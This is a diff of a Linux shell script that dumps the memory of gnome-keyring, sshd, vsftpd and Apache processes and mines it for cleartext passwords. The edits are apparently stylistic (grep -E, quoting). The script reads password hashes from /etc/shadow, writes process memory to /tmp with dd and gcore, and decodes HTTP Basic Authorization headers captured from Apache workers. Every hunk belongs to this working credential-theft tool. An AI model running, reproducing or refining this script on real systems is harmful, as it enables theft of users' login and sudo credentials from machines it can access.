@@ -22,18 +22,18 @@ function dump_pid () {
 	pid=$1
 	output_file=$2
 	if [[ $system == "kali" ]]; then
-		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' | cut -d' ' -f 1)
+		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | grep -E 'heap|stack' | cut -d' ' -f 1)
 	else
-		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d' ' -f 1)
+		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1)
 	fi
 	while read -r memrange; do
-		memrange_start=`echo $memrange | cut -d"-" -f 1`;
-		memrange_start=`printf "%u\n" 0x$memrange_start`;
-		memrange_stop=`echo $memrange | cut -d"-" -f 2`;
-		memrange_stop=`printf "%u\n" 0x$memrange_stop`;
-		memrange_size=$(($memrange_stop - $memrange_start));
-		dd if=/proc/$pid/mem of=${output_file}.${pid} ibs=1 oflag=append conv=notrunc \
-			skip=$memrange_start count=$memrange_size > /dev/null 2>&1
+		memrange_start=$(echo "$memrange" | cut -d"-" -f 1)
+		memrange_start=$(printf "%u\n" 0x"$memrange_start")
+		memrange_stop=$(echo "$memrange" | cut -d"-" -f 2)
+		memrange_stop=$(printf "%u\n" 0x"$memrange_stop")
+		memrange_size=$((memrange_stop - memrange_start))
+		dd if=/proc/$pid/mem of="${output_file}"."${pid}" ibs=1 oflag=append conv=notrunc \
+			skip="$memrange_start" count="$memrange_size" > /dev/null 2>&1
 	done <<< "$mem_maps"
 }
 
@@ -44,7 +44,7 @@ function parse_pass () {
 
 	#If hash not in dump get shadow hashes
 	if [[ ! "$2" ]]; then
-			SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
+			SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
 	fi
 
 	#Determine password potential for each word
@@ -91,7 +91,7 @@ function parse_pass () {
 	             "(aoao)"\
 	             "stuv")
 	    export RESULTS="$RESULTS[HIGH]$4			$line\n"
-	    for pattern in $patterns;do
+	    for pattern in "${patterns[@]}"; do
 	      if [[ $line =~ $pattern ]]; then
 	        export RESULTS="$RESULTS[LOW]$4			$line\n"
 	      fi
@@ -110,10 +110,10 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/dump "kali"
-			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+\$')"
+			HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-			DUMP="$(strings "/tmp/dump.${pid}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
-			DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
+			DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
+			DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
@@ -135,10 +135,10 @@ if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/dump
-			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+\$')"
+			HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
-			DUMP+=$(strings "/tmp/dump.${pid}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
+			DUMP=$(strings "/tmp/dump.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
+			DUMP+=$(strings "/tmp/dump.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
@@ -157,9 +157,9 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	if [[ $PID ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/vsftpd
-			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+\$')"
+			HASH="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+			DUMP=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
@@ -179,12 +179,12 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 	if [[ "$PID" ]];then
 		#Dump all workers
 		while read -r pid; do
-			gcore -o /tmp/apache $pid > /dev/null 2>&1
+			gcore -o /tmp/apache "$pid" > /dev/null 2>&1
 			#without gcore - VERY SLOW!
 			#dump_pid $pid /tmp/apache
 		done <<< "$PID"
 		#Get encoded creds
-		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
+		DUMP="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
 		#for each extracted b64 - decode the cleartext
 		while read -r encoded; do
 			CREDS="$(echo "$encoded" | base64 -d)"
@@ -201,14 +201,14 @@ fi
 if [[ -e "/etc/ssh/sshd_config" ]]; then
 	SOURCE="[SYSTEM - SSH]"
 	#get all ssh tty/pts sessions - sshd: user@pts01
-	PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
+	PID="$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
 	#if exists aka someone logged into SSH then dump
 	if [[ "$PID" ]];then
 		while read -r pid; do
 			dump_pid "$pid" /tmp/sshd
-			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+\$')"
+			HASH="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
+			DUMP=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
